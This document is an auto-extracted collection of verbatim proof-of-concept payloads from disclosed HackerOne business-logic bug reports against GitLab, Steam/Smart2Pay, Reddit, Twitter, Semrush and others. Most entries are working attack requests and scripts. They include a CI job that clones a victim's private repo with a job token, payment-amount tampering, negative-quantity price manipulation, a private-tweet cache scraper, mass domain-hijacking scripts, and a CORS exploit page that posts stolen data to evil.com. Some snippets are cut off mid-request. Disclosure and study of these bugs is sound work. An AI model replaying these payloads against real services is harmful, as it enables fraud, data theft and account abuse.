# Business logic — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #894569 An attacker can run pipeline jobs as arbitrary user — gitlab — $12,000 — Business Logic Errors
Source: `hackerone/reports/2020/894569.md` (https://hackerone.com/reports/894569)

```
image: "ruby:2.6"

before_script:
  - echo Hello

rspec:
  script:
    - echo Hello
```

```
image: "ruby:2.6"

rspec:
  script:
    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/victim/private_repo_name.git
    - cd private_repo_name
    - ls -lah .
    - cat README.md
```

```
bundle exec rake gitlab:env:info RAILS_ENV=development
System information
System:		
Proxy:		no
Current User:	u3mur4
Using RVM:	no
Ruby Version:	2.6.6p146
Gem Version:	3.0.3
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	6.0.4
Git Version:	2.27.0
Sidekiq Version:5.2.7
Go Version:	go1.14.4 linux/amd64

GitLab information
Version:	13.1.0-pre
Revision:	4bd9f8164e0
Directory:	/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab
DB Adapter:	PostgreSQL
DB Version:	12.3
URL:		http://gdk.yoyo.pw:3000
HTTP Clone URL:	http://gdk.yoyo.pw:3000/some-group/some-project.git
SSH Clone URL:	ssh://u3mur4@gdk.yoyo.pw:2222/some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: google_oauth2

GitLab Shell
Version:	13.3.0
Repository storage paths:
- default: 	/home/u3mur4/Hack/gitlab/gitlab-development-kit/repositories
GitLab Shell path:		/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab-shell
Git:		/usr/bin/git
```

## #1295844 Modify in-flight data to payment provider Smart2Pay — valve — $7,500 — Business Logic Errors
Source: `hackerone/reports/2021/1295844.md` (https://hackerone.com/reports/1295844)

```
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://store.steampowered.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

MerchantID=1102&MerchantTransactionID=███&Amount=2000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brixamount100abc%40███████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=███
```

```
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://store.steampowered.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

MerchantID=1102&MerchantTransactionID=██████&Amount2=000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brix&amount=100&ab=c%40██████████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=█████████
```

## #1543159 Able to approve admin approval and change effective status without adding payment details .  — reddit — $5,000 — Business Logic Errors
Source: `hackerone/reports/2022/1543159.md` (https://hackerone.com/reports/1543159)

```
PATCH /api/v2.0/accounts/█████/ads/██████████ HTTP/2
Host: ads-api.reddit.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ads.reddit.com/
Authorization: bearer token
Content-Type: application/json
Origin: https://ads.reddit.com
Content-Length: 101
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Pwnfox-Color: magenta
Te: trailers

{"data":
{"configured_status":"ACTIVE",
"effective_status":"ACTIVE",
"admin_approval":"APPROVED"
}}
```

```
PATCH /api/v2.0/accounts/█████/ads/██████████ HTTP/2
Host: ads-api.reddit.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ads.reddit.com/
Authorization: bearer token
Content-Type: application/json
Origin: https://ads.reddit.com
Content-Length: 101
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Pwnfox-Color: magenta
Te: trailers

{"data":
```

## #263760 Opportunity to obtain private tweets through search widget preview caches — x — $1,120 — Business Logic Errors
Source: `hackerone/reports/2017/263760.md` (https://hackerone.com/reports/263760)

```
	public static void getJSON()
	{
		try {
			String old="";
			Scanner s1=new Scanner(System.in);
			System.out.println("Enter query");
			String query=s1.nextLine();
			//String query="testAcc1989";
			Set<String> s=new HashSet<String>();
			for(int i=1;i<200;i++)
			{
				String url="https://█████/widgets/timelines/preview?all_results=on&callback=__twttr.callbacks.tl_i"+i+"█████";	
			Document doc = Jsoup.connect(url)
					.header("Host", "██████████")
					.header("Cache-control", "max-age=31556926").header("Cache-store", "max-age=31556926")
					.userAgent("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0")
					.header("Accept-Encoding", "gzip, deflate, br") // Caching 
					.ignoreContentType(true)
					.get();
			String newVal=doc.html().substring(doc.html().indexOf("config"));
			if(!old.equals(newVal) && s.add(newVal)){
			old=newVal;
			System.out.println("-------------------------------------------------------Callback url which have cache "+url);
			//System.out.println(doc.html()); //Use this to print cached version
			}
			}
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
```

```
GET /widgets/timelines/preview?all_results=on&callback=__twttr.callbacks.tl_i<some number>_preview_old&do_not_track=false&expand_media=false&height=350&lang=en&query=countblank&safe_mode=on&suppress_response_codes=true&theme=light&timeline_type=search HTTP/1.1
Host: █████
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36
Accept: */*
Referer: https://twitter.com/settings/widgets/new
Accept-Language: en-US,en;q=0.8
Cookie: lang=en

New Request (Make sure to change to __twttr.callbacks.tl_i73_preview_old since this cache has not been overwritten by correct data):
```

```
GET /widgets/timelines/preview?all_results=on&callback=__██████ HTTP/1.1
Host: ███
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36
Accept: */*
Referer: https://twitter.com/settings/widgets/new
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cookie: lang=en

6) Forward the new request
```

## #462503 Claiming package names in GitLab's automatic package referencer. — gitlab — $1,000 — Business Logic Errors
Source: `hackerone/reports/2019/462503.md` (https://hackerone.com/reports/462503)

```
<div class="blob-viewer" data-type="auxiliary">
   <i aria-hidden="true" data-hidden="true" class="fa fa-cubes fa-fw"></i>
   This project manages its dependencies using
   <strong>npm</strong>
   and defines a package named
   <strong><a target="_blank" rel="noopener noreferrer" href="https://www.npmjs.com/package/gitter-desktop">gitter-desktop</a></strong>.
   <a target="_blank" rel="noopener noreferrer" href="https://www.npmjs.com/">Learn more</a>
</div>
```

## #312118 Using GitLab to monitor and hijack domains in mass quantity. — gitlab — $750 — Business Logic Errors
Source: `hackerone/reports/2018/312118.md` (https://hackerone.com/reports/312118)

```
#!/bin/bash

searches=(
    "The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it."
)

gron "https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135" | fgrep "domain" | grep -o '"[^"]\+"' | cut -d '"' -f 2 > whiteknight-temp

while read domain; do
    if host "$domain"> /dev/null; then
        echo $domain;
    fi;
done < whiteknight-temp >> domains

cat domains | uniq | sed -e 's/^/https:\/\//' >> domains-to-test

meg / domains-to-test

for str in "${searches[@]}"; do
    grep --color -Hnri "$str" out/
done

while read target; do
    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data "utf8=✓&authenticity_token=████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]"
done < domains

gio trash whiteknight-temp domains domains-to-test out/
```

```
#!/bin/bash

IPS=(
    # GitLab
    "52.167.214.135"
    # GitHub
    "192.30.252.153"
    "192.30.252.154"
    # Shopify
    "23.227.38.32"
)

for ip in "${IPS[@]}"; do
    gron "https://app.securitytrails.com/api/search/by_type/ip/$ip" | fgrep "domain" | grep -o '"[^"]\+"' | cut -d '"' -f 2 > whiteknight-temp
done

while read domain; do
    if host "$domain"> /dev/null; then
        echo $domain;
    fi;
done < whiteknight-temp >> domains

while read target; do
    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data "utf8=✓&authenticity_token=███████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]"
done < domains

gio trash whiteknight-temp domains domains-to-test out/
```

```
    "The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it."
```

## #1365738 critical server misconfiguration lead to access to any user sensitive data which include user email and password — flickr — $500 — Business Logic Errors
Source: `hackerone/reports/2021/1365738.md` (https://hackerone.com/reports/1365738)

```
Y.listData = {
		"user": {
				"id": "█████",
				"first_name": "███████",
				"last_name": "████",
				"email": "███",
				"date_creation": "█████",
				"date_modified": "0",
				"password": "██████",
				"city": "los angelos",
				"country": "United states",
				"check_code": "",
				"email_conf": "1",
				"email_conf_bounce": "0",
				"nsid": "███████",
				"character_name": "███████",
				"gender": "M",
				"magic_email": "",
				"is_admin": "0",
				"is_bad": "0",
				"prefs_main_1": "2056",
				"prefs_main_2": "262161",
				"mail_buffer": "",
				"deleted": "0",
				"kill": "0",
				"kill_from": "0",
				"refer_code": "",
				"date_limit": "0",
				"photo_id_limit": "0",
				"date_premium_end": "0",
				"is_paid_pro": "0",
				"has_order_history": "0",
				"gifts_to_give": "0",
				"path_alias": null,
				"date_iconchange": "0",
				"pref_default_license": "0",
				"upload_email_tags": "",
				"upload_email_size": "2",
				"upload_email_body": "0",
				"timezone_id": "5",
				"timezone_dst": "1",
				"buddyicon_server": "0",
				"unread_mail": "0",
				"yid": "███████",
				"yhid": "████████",
				"dot_yjid": null,
				"yintl": "eg",
				"lang": "1",
				"cluster_id": "39",
				"cluster_lock": "0",
				"adultness": "2",
				"commercial": "0",
				"last_activity": "1633964310",
				"bb_partner_id": "0",
				"stats_cluster_id": "1",
				"stats_cluster_lock": "0",
				"yreg": "0",
				"has_stats": "0",
				"contact_cluster_id": "1",
				"contact_cluster_lock": "0",
				"un
```

## #460920 Response program can create bounty table — security — $500 — Business Logic Errors
Source: `hackerone/reports/2019/460920.md` (https://hackerone.com/reports/460920)

```
POST /graphql HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/bountyprogram/reward_settings
content-type: application/json
x-auth-token: █████████
origin: https://hackerone.com
Content-Length: 1512
Connection: close
Cookie: ███████

{"query":"mutation Update_bounty_table_mutation($input_0:UpdateBountyTableInput!,$first_1:Int!,$types_2:[ErrorTypeEnum]!) {\n  updateBountyTable(input:$input_0) {\n    clientMutationId,\n    ...F1,\n    ...F2\n  }\n}\nfragment F0 on Team {\n  id,\n  bounty_table {\n    low_label,\n    medium_label,\n    high_label,\n    critical_label,\n    description,\n    _bounty_table_rows3iMmxf:bounty_table_rows(first:$first_1) {\n      edges {\n        node {\n          id,\n          low,\n          medium,\n          high,\n          critical,\n          structured_scope {\n            id\n          }\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    id,\n    team {\n      id\n    }\n  }\n}\nfragment F1 on UpdateBountyTablePayload {\n  team {\n    id,\n    ...F0\n  }\n}\nfragment F2 on UpdateBountyTablePayload {\n  was_successful,\n  _errors2S3JlH:errors(types:$types_2) {\n    edges {\n      node {\n        type,\n        field,\n        message,\n        id\n      },\n      cursor\n    },\n    pageInfo {\n 
```

```
POST /graphql HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/bountyprogram/reward_settings
content-type: application/json
x-auth-token: █████████
origin: https://hackerone.com
Content-Length: 1512
Connection: close
Cookie: ███████

{"query":"mutation Update_bounty_table_mutation($input_0:UpdateBountyTableInput!,$first_1:Int!,$types_2:[ErrorTypeEnum]!) {\n  updateBountyTable(input:$input_0) {\n    clientMutationId,\n    ...F1,\n    ...F2\n  }\n}\nfragment F0 on Team {\n  id,\n  bounty_table {\n    low_label,\n    medium_label,\n    high_label,\n    critical_label,\n    description,\n    _bounty_table_rows3iMmxf:bounty_table_rows(first:$first_1) {\n      edges {\n        node {\n          id,\n          low,\n          medium,\n          high,\n          critical,\n          structured_scope {\n            id\n          }\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    id,\n    team {\n      id\n    }\n  }\n}\nfragment F1 on UpdateBountyTableP
```

## #1112679 Dangling cloud instance at vpn.inverselink.com — security — $500 — Business Logic Errors
Source: `hackerone/reports/2021/1112679.md` (https://hackerone.com/reports/1112679)

```
% dig  vpn.inverselink.com +short
54.202.130.246

 % curl -v https://vpn.inverselink.com
*   Trying 54.202.130.246...
* TCP_NODELAY set
* Connected to vpn.inverselink.com (54.202.130.246) port 443 (#0)
[...]
* Server certificate:
*  subject: C=US; ST=California; L=Pleasanton; O=Workday Inc.; CN=*.workdaysuv.com
```

## #3610332 Approval app's file-freshness check can be bypassed by omitting the etag parameter, allowing approval of unreviewed file changes — nextcloud — $150 — Business Logic Errors
Source: `hackerone/reports/2026/3610332.md` (https://hackerone.com/reports/3610332)

```
PUT /ocs/v2.php/apps/approval/api/v1/approve/14831 HTTP/1.1
Host: 172.16.88.96:8081
Content-Length: 19
requesttoken: VG7aXKzexiptXUcHCI4D3kSYtm7Ka9qPYV/cPqY98nQ=:PQucC5msr3wlKB5GYd157nHO0RSPIYnGI3SUe/YMkwE=
X-Requested-With: XMLHttpRequest, XMLHttpRequest
Accept-Language: vi-VN,vi;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Origin: http://172.16.88.96:8081
Accept-Encoding: gzip, deflate, br
Cookie: oc_sessionPassphrase=h0hEbFC0ZNEg6Gqy4BzpKCPT9G99atcnoDLkZETROFjdM5pBmz0CGEZiRgeoPI%2BU9qXj9UC6Ayu2TpojCyMA32cLlAj%2Bms9gvLYnViKC%2BhNWO9B0i3rBmR1YewWvEKhj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; ocrzkzhsljc2=61f75550c287a8d21a3a557dd913e7ca; nc_username=test2; nc_token=a787oSWw0nXxsNOytys1vIoZTGKXsi6d; nc_session_id=61f75550c287a8d21a3a557dd913e7ca
Connection: keep-alive

{"message":"test2"}
```

```
HTTP/1.1 200 OK
Date: Tue, 17 Mar 2026 08:30:21 GMT
Server: Apache/2.4.66 (Debian)
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Robots-Tag: noindex, nofollow
Referrer-Policy: no-referrer
X-Powered-By: PHP/8.3.30
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
X-Request-Id: 8xMLCrwKUw0gFWKsJVTu
Cache-Control: no-cache, no-store, must-revalidate
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
X-User-Id: test2
Content-Length: 74
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":[]}}
```

## #428660 Gallery: No feedback for invalid password — nextcloud — $50 — Business Logic Errors
Source: `hackerone/reports/2019/428660.md` (https://hackerone.com/reports/428660)

```
    http://192.168.0.103/nextcloud/nextcloud/index.php/apps/gallery/#dummy_192x192.png
```

## #423467 H1514 Ability to MiTM Shopify PoS Session to Takeover Communications — shopify — - — Business Logic Errors
Source: `hackerone/reports/2019/423467.md` (https://hackerone.com/reports/423467)

```
private final String getConnectionString() {
    String initialPublicKey = this.crypto.initialPublicKey();
    String initialNonce = this.crypto.initialNonce();
    String currentWifiIpAddress = NetworkUtility.getCurrentWifiIpAddress(PosApplication.Companion.getInstance());
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.protocol);
    stringBuilder.append("://");
    stringBuilder.append(currentWifiIpAddress);
    stringBuilder.append(':');
    stringBuilder.append(this.port);
    stringBuilder.append(';');
    stringBuilder.append(initialPublicKey);
    stringBuilder.append(';');
    stringBuilder.append(initialNonce);
    stringBuilder.append(';');
    PayloadManager payloadManager = this.payloadManager;
    if (payloadManager == null) {
        Intrinsics.throwUninitializedPropertyAccessException("payloadManager");
    }
    stringBuilder.append(payloadManager.getSchemaVersion());
    return stringBuilder.toString();
}
```

```
vbox86p:/ # netstat -an | egrep 'LISTEN[^I]'
tcp        0      0 0.0.0.0:24800           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:24801         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:27042         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22468           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:24810           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:24811         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5037          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
tcp        0      0 :::5000                 :::*                    LISTEN <---
tcp        0      0 :::24296                :::*                    LISTEN
tcp        0      0 :::6379                 :::*                    LISTEN
tcp        0      0 :::5555                 :::*                    LISTEN
```

```
public void receiveMessageFromServer(String str, CryptoType cryptoType, String str2) {
    Intrinsics.checkParameterIsNotNull(str, "message");
    Intrinsics.checkParameterIsNotNull(cryptoType, "type");
    Intrinsics.checkParameterIsNotNull(str2, "publicKeyString");
    if (WhenMappings.$EnumSwitchMapping$0[cryptoType.ordinal()] != 1) {
        str = new Hex().decode(str);
        Intrinsics.checkExpressionValueIsNotNull(str, "decodedMessageString");
        str = handleIncomingMessage(str, cryptoType, str2);
        if (str != null) {
            getDecryptedMessageHandler().invoke(new String(str, Charsets.UTF_8));
            str = handleOutgoingMessage(CryptoConstant.ACK.encoded(), cryptoType);
            if (str != null) {
                str = new Hex().encode(str);
                Intrinsics.checkExpressionValueIsNotNull(str, "Hex().encode(cipherText)");
                String publicKey = getSenderKeyPair().getPublicKey().toString();
                Intrinsics.checkExpressionValueIsNotNull(publicKey, "senderKeyPair.publicKey.toString()");
                getEncryptedMessageHandler().invoke(new CryptoMessage(cryptoType, str, publicKey));
                return;
            }
            return;
        }
        return;
    }
    str = new Hex().decode(str2);
    Intrinsics.checkExpressionValueIsNotNull(str, "Hex().decode(publicKeyString)");
--->setReceiverPublicKey(str);
    onAckReceived();
}
```

## #771694 An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss — semrush — - — Business Logic Errors
Source: `hackerone/reports/2020/771694.md` (https://hackerone.com/reports/771694)

```
POST /marketplace/api/purchases/bulk HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.semrush.com/marketplace/offers/
Content-type: application/json
Origin: https://www.semrush.com
Content-Length: 45
DNT: 1
Connection: close
Cookie: COOKIES

{"items":{"article_500":1,"article_1000":1}}
```

```
{"items":{"article_500":4,"article_1000":-2}}
```

## #364843 OLO Total price manipulation using negative quantities — upserve — - — Business Logic Errors
Source: `hackerone/reports/2019/364843.md` (https://hackerone.com/reports/364843)

```
{"card_uuid": "09ef096d-18d7-4cb4-83b7-5bd15d310aac", "city": "Cambridge", "email": "mthompson@hexwave.com", "first_name": "Matt", "last_name": "Thompson", "line1": "1230 Massachusetts Ave", "order": {"charges": {"items": [{"item_id": "254baa85-92c1-412e-a391-aaf44508d882", "name": "ChickenBurger", "price": 1200, "quantity": 2, "instructions": "", "total": 1200, "modifiers": [], "sides": []}, {"item_id": "9169bfc1-2ee1-455b-ad65-aeadd36f46eb", "name": "BreadPudding", "price": 900, "quantity": -1, "instructions": "", "total": 900, "modifiers": [], "sides": []}], "taxes": 290, "tip": {"amount": 0}, "total": 1870}, "confirmation_code": "upserve-hacker-cafe-32870", "fulfillment_info": {"customer": {"email": "mthompson@hexwave.com", "first_name": "Matt", "last_name": "Thompson", "phone": "555-555-5555"}, "delivery_info": {"address": {"address_line1": "1230 Massachusetts Ave", "address_line2": null, "city": "Cambridge", "country": "", "state": "MA", "zip_code": "02138"}}, "instructions": "", "type": "delivery"}, "id": "a168f311-f0bf-416c-b813-b277e3a7b5b3", "payments": {"payments": [{"amount": 0, "payment_type": "CREDIT", "tip_amount": 0}], "total": 3190}, "time_placed": "2018-06-11T20:48:51.313Z"}, "order_total": 3190, "phone_number": "555-555-5555", "state": "MA", "store_pretty_url": "upserve-lounge-test-providence-2", "submission_id": "a168f311-f0bf-416c-b813-b277e3a7b5b3", "text_alerts": false, "zip": "02138"}
```

## #768151 Bypassing CORS Misconfiguration Leads to Sensitive Exposure — deptofdefense — - — Business Logic Errors
Source: `hackerone/reports/2020/768151.md` (https://hackerone.com/reports/768151)

```
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal customer data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://██████/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

## #3255473 Business Logic Error – Bypass of OTP Verification During Signup on hover.com — tucows_vdp — - — Business Logic Errors
Source: `hackerone/reports/2025/3255473.md` (https://hackerone.com/reports/3255473)

```
POST /signup HTTP/2
Host: www.hover.com
Cookie: {{cookie}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/██████████ Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.hover.com/signup
Uzlc: true
Content-Type: application/json;charset=UTF-8
Content-Length: 233
Origin: https://www.hover.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{
  "account": {
    "terms_version": 2,
    "first_name": "███",
    "last_name": "Sec",
    "email": "████",
    "username": "███",
    "password": "███",
    "token": null,
    "code": "624187",
    "tosValues": {
      "consent": true,
      "newsletter": true
    }
  }
}
```

```
{
  "account": {
    "terms_version": 2,
    "first_name": "████",
    "last_name": "Sec",
    "email": "███████████",
    "username": "████████",
    "password": "████",
    "token": null,
    "tosValues": {
      "consent": true,
      "newsletter": true
    }
  }
}
```

```
HTTP/2 200 OK
{"success": true}
```

## #2450215 Any user could upload attachments to pentest scoping form they don't have access to — security — - — Business Logic Errors
Source: `hackerone/reports/2024/2450215.md` (https://hackerone.com/reports/2450215)

```
POST /attachments HTTP/2
Host: hackerone.com
Cookie: your cookies
-----------------------------22121373215470710503552942440
Content-Disposition: form-data; name="tracer"

989953fa-5635-43c9-b584-48736d224b15
```

## #397792 @wearehackerone.com is vulnerable to namespace attacks due to hackerone.com not being RFC2142 compliant. — security — - — Business Logic Errors
Source: `hackerone/reports/2019/397792.md` (https://hackerone.com/reports/397792)

```
MAILBOX        AREA                USAGE
-----------    ----------------    ---------------------------
ABUSE          Customer Relations  Inappropriate public behaviour
NOC            Network Operations  Network infrastructure
SECURITY       Network Security    Security bulletins or queries
```

```
abuse
admin
administrator
hostmaster
info
is
it
list
list-request
majordomo
marketing
mis
news
postmaster
root
sales
security
ssl-admin
ssladmin
ssladministrator
sslwebmaster
support
sysadmin
trouble
usenet
uucp
webmaster
```

## #2125049 Unlimited fake rate to the passenger in city to city, Affected endpoint `/api/v1/reviews/ride/<ID>/driver` — indrive — - — Business Logic Errors
Source: `hackerone/reports/2024/2125049.md` (https://hackerone.com/reports/2125049)

```
    POST /api/v1/reviews/ride/███/driver HTTP/2
    Host: intercity-3.eu-east-1.indriverapp.com
    X-City-Id: 9415
    Accept-Language: en_US
    X-Os-Type: android
    X-App-Flavor: indriver
    X-App: android 5.41.1
    ██████
    Authorization: Bearer █████
    Traceparent: ██████
    Content-Type: application/json; charset=utf-8
    Content-Length: 32
    Accept-Encoding: gzip, deflate
    User-Agent: okhttp/4.10.0
    
    {"message":"Prince","rating":5}
    
```

```
    '''
    POST /api/v1/reviews/ride/███/driver HTTP/2
    Host: intercity-3.eu-east-1.indriverapp.com
    X-City-Id: 9415
    Accept-Language: en_US
    X-Os-Type: android
    X-App-Flavor: indriver
    X-App: android 5.41.1
    ██████
    Authorization: Bearer █████
    Traceparent: ██████
    Content-Type: application/json; charset=utf-8
    Content-Length: 32
    Accept-Encoding: gzip, deflate
    User-Agent: okhttp/4.10.0
```

```
    {"message":"Prince","rating":5}
    '''
```

## #2263294 Cloud Computer Hackerone Triager can be Accessible for everyone [h1_analyst_lucas+view@wearehackerone.com] computer — security — - — Business Logic Errors
Source: `hackerone/reports/2024/2263294.md` (https://hackerone.com/reports/2263294)

```
██████ RS1FIMUNSRVJGVFZLTl84NiIsImV2ZW50U3RhcnRUaW1lIjoxNzAwNzg0MTYyMzg1LCJoaWVyYXJjaHkiOiJzcmMiLCJvcmlnaW5Qcm9jZXNzU3RhcnRUaW1lIjoxNzAwNzg0MTYyMzIxLCJv cmlnaW5Qcm9jZXNzVW5pcXVlSWQiOiI1Rjk1QzJDNDY0RESERBRKRFIiwicHJvY2Vzc0deep3VwSWQiOiIxNTg4QjhDNDY0RESERBRKRFIn0%3D
```

```
ls
cd ..
cd  Users
ls
done
```

## #997070 No rate limiting for confirmation email lead to huge Mass mailings — nextcloud — - — Business Logic Errors
Source: `hackerone/reports/2020/997070.md` (https://hackerone.com/reports/997070)

```
POST /index.php/apps/registration/ HTTP/1.1
Host: efss.qloud.my
Accept-Language: en-US,en;q=0.5
